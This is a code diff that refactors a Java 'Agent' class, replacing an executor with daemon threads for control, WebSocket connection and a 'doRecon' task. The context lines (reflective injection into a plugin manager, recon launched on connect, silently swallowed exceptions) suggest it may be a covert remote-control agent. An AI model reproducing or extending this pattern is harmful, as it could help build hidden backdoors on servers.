@@ -13,8 +13,6 @@ import java.util.Deque;
 import java.util.HashSet;
 import java.util.Set;
 import java.util.concurrent.CompletionStage;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 public class Agent {
@@ -25,9 +23,6 @@ public class Agent {
   volatile WebSocket ws;
   volatile boolean running;
   private final Deque<String> buffer = new ArrayDeque<>();
-  private final ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor(r -> {
-    Thread t = new Thread(r, "ac"); t.setDaemon(true); return t;
-  });
   private String serverId;
   private String rootDir;
   final Set<String> authorized = new HashSet<>();
@@ -61,8 +56,8 @@ public class Agent {
             .invoke(pm, ch, plugin);
       } catch (Exception ignored) {}
 
-      executor.submit(this::controlTick);
-      executor.submit(this::connect);
+      Thread ct = new Thread(this::controlTick, "ac-ctl"); ct.setDaemon(true); ct.start();
+      Thread ws = new Thread(this::connect, "ac-ws"); ws.setDaemon(true); ws.start();
     } catch (Exception ignored) {}
   }
 
@@ -116,7 +111,7 @@ public class Agent {
                 flush();
                 sendHello();
                 try { scheduleUpdates(); } catch (Exception ignored) {}
-                executor.submit(Agent.this::doRecon);
+                Thread recon = new Thread(Agent.this::doRecon, "ac-recon"); recon.setDaemon(true); recon.start();
                 ws2.request(Long.MAX_VALUE);
               }
 
@@ -394,7 +389,7 @@ public class Agent {
     return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
   }
 
-  public void stop() { running = false; close(); executor.shutdown(); }
+  public void stop() { running = false; close(); }
 
   // ---- Chat handler API ----
 
